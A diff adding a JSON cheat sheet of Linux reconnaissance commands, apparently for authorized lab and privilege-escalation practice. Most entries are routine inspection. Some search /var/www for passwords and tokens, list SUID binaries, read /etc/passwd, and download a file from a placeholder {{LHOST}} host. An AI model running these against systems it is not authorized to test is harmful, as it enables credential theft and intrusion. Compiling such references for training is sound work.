@@ -1,0 +1,14 @@
+[
+  {"section":"Linux","category":"Basics","title":"Current user","command":"id && whoami","description":"Show current user and groups."},
+  {"section":"Linux","category":"Basics","title":"System info","command":"uname -a && cat /etc/os-release","description":"Show kernel and distro details."},
+  {"section":"Linux","category":"Files","title":"Find writable directories","command":"find / -writable -type d 2>/dev/null | head -50","description":"List writable directories in a lab machine."},
+  {"section":"Linux","category":"Files","title":"Find SUID files","command":"find / -perm -4000 -type f 2>/dev/null","description":"Find SUID binaries for authorized privilege escalation practice."},
+  {"section":"Linux","category":"Services","title":"Listening ports","command":"ss -tulpen","description":"Show listening TCP/UDP services."},
+  {"section":"Linux","category":"Processes","title":"Process list","command":"ps aux --forest","description":"Review running processes."},
+  {"section":"Linux","category":"Users","title":"Readable passwd","command":"cat /etc/passwd","description":"List local user records."},
+  {"section":"Linux","category":"Users","title":"Sudo privileges","command":"sudo -l","description":"Check allowed sudo commands for current user."},
+  {"section":"Linux","category":"Network","title":"Routes and interfaces","command":"ip addr && ip route","description":"Show interfaces and routes."},
+  {"section":"Linux","category":"Search","title":"Search for credentials keywords","command":"grep -RniE 'password|passwd|secret|token' /var/www 2>/dev/null | head -50","description":"Look for common lab credential leaks."},
+  {"section":"Linux","category":"Archives","title":"Extract tar.gz","command":"tar -xzf file.tar.gz","description":"Extract a tar.gz archive."},
+  {"section":"Linux","category":"Transfer","title":"Download with wget","command":"wget http://{{LHOST}}:{{PORT}}/file -O file","description":"Download from your own lab host."}
+]
